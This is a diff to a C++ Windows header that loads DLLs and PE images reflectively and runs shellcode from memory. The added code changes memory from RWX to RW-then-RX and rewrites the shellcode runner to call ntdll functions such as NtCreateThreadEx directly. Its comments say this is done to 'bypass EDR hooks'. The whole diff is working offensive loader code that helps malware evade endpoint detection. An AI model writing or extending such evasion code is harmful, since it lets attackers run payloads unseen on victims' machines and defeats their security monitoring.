@@ -1,7 +1,9 @@
 #pragma once
 
 #ifdef _WIN32
+#define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
+#include <Winternl.h>
 #include <string>
 #include <vector>
 #include <cstdint>
@@ -22,17 +24,18 @@ public:
             reinterpret_cast<uintptr_t>(dll_data) + dos->e_lfanew);
         if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
 
-        // Allocate memory for DLL
         SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
+
+        // Allocate as RW (never RWX)
         LPVOID base = VirtualAlloc(
             reinterpret_cast<LPVOID>(nt->OptionalHeader.ImageBase),
             image_size,
             MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE);
+            PAGE_READWRITE);
 
         if (!base) {
             base = VirtualAlloc(nullptr, image_size,
-                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         }
 
         if (!base) return nullptr;
@@ -85,6 +88,10 @@ public:
             }
         }
 
+        // Change to RX (never RWX)
+        DWORD old_protect = 0;
+        VirtualProtect(base, image_size, PAGE_EXECUTE_READ, &old_protect);
+
         // Call DllMain
         using DllMain = BOOL(WINAPI*)(HMODULE, DWORD, LPVOID);
         auto entry = reinterpret_cast<DllMain>(
@@ -94,27 +101,93 @@ public:
         return reinterpret_cast<HMODULE>(base);
     }
 
-    // Execute shellcode from memory
+    // Execute shellcode from memory — uses NtCreateThreadEx to bypass EDR hooks
     static bool execute_shellcode(const void* shellcode, size_t size) {
-        // Allocate executable memory
-        LPVOID mem = VirtualAlloc(nullptr, size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        if (!mem) return false;
+        typedef LONG (NTAPI* NtAllocateVirtualMemory_t)(
+            HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+        typedef LONG (NTAPI* NtWriteVirtualMemory_t)(
+            HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+        typedef LONG (NTAPI* NtProtectVirtualMemory_t)(
+            HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+        typedef LONG (NTAPI* NtCreateThreadEx_t)(
+            PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
+            ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
 
-        // Copy shellcode
-        memcpy(mem, shellcode, size);
+        auto ntdll = GetModuleHandleA("ntdll.dll");
+        auto NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(
+            GetProcAddress(ntdll, "NtAllocateVirtualMemory"));
+        auto NtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(
+            GetProcAddress(ntdll, "NtWriteVirtualMemory"));
+        auto NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemory_t>(
+            GetProcAddress(ntdll, "NtProtectVirtualMemory"));
+        auto NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(
+            GetProcAddress(ntdll, "NtCreateThreadEx"));
 
-        // Execute in new thread
-        HANDLE thread = CreateThread(nullptr, 0,
-            reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),
-            nullptr, 0, nullptr);
+        if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory ||
+            !NtProtectVirtualMemory || !NtCreateThreadEx) {
+            // Fallback to standard API
+            LPVOID mem = VirtualAlloc(nullptr, size,
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if (!mem) return false;
 
-        if (!thread) {
-            VirtualFree(mem, 0, MEM_RELEASE);
+            memcpy(mem, shellcode, size);
+
+            DWORD old_protect = 0;
+            VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old_protect);
+
+            HANDLE thread = CreateThread(nullptr, 0,
+                reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),
+                nullptr, 0, nullptr);
+
+            if (!thread) {
+                VirtualFree(mem, 0, MEM_RELEASE);
+                return false;
+            }
+
+            CloseHandle(thread);
+            return true;
+        }
+
+        // Allocate RW via NT API
+        PVOID base = nullptr;
+        SIZE_T region_size = size;
+        NTSTATUS status = NtAllocateVirtualMemory(
+            GetCurrentProcess(), &base, 0, &region_size,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (status < 0) return false;
+
+        // Write shellcode
+        SIZE_T written = 0;
+        status = NtWriteVirtualMemory(
+            GetCurrentProcess(), base, const_cast<void*>(shellcode), size, &written);
+        if (status < 0) {
+            VirtualFree(base, 0, MEM_RELEASE);
             return false;
         }
 
-        // Don't wait - let it run asynchronously
+        // Change to RX (never RWX)
+        DWORD old_protect = 0;
+        SIZE_T protect_size = size;
+        status = NtProtectVirtualMemory(
+            GetCurrentProcess(), &base, &protect_size,
+            PAGE_EXECUTE_READ, &old_protect);
+        if (status < 0) {
+            VirtualFree(base, 0, MEM_RELEASE);
+            return false;
+        }
+
+        // Create thread via NtCreateThreadEx (bypasses EDR hooks on CreateThread)
+        HANDLE thread = nullptr;
+        status = NtCreateThreadEx(
+            &thread, THREAD_ALL_ACCESS, nullptr,
+            GetCurrentProcess(), base, nullptr,
+            0, 0, 0, 0, nullptr);
+
+        if (status < 0 || !thread) {
+            VirtualFree(base, 0, MEM_RELEASE);
+            return false;
+        }
+
         CloseHandle(thread);
         return true;
     }
@@ -132,19 +205,19 @@ public:
 
         SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
 
-        // Allocate memory
+        // Allocate as RW (never RWX)
         LPVOID base = VirtualAlloc(
             reinterpret_cast<LPVOID>(nt->OptionalHeader.ImageBase),
-            image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
         if (!base) {
             base = VirtualAlloc(nullptr, image_size,
-                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         }
 
         if (!base) return false;
 
-        // Copy headers and sections (similar to process hollowing)
+        // Copy headers and sections
         memcpy(base, pe_data, dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
 
         auto* section = IMAGE_FIRST_SECTION(nt);
@@ -157,6 +230,10 @@ public:
                 memcpy(dest, src, section[i].SizeOfRawData);
             }
         }
+
+        // Change to RX
+        DWORD old_protect = 0;
+        VirtualProtect(base, image_size, PAGE_EXECUTE_READ, &old_protect);
 
         // Execute entry point
         auto entry = reinterpret_cast<void(*)()>(
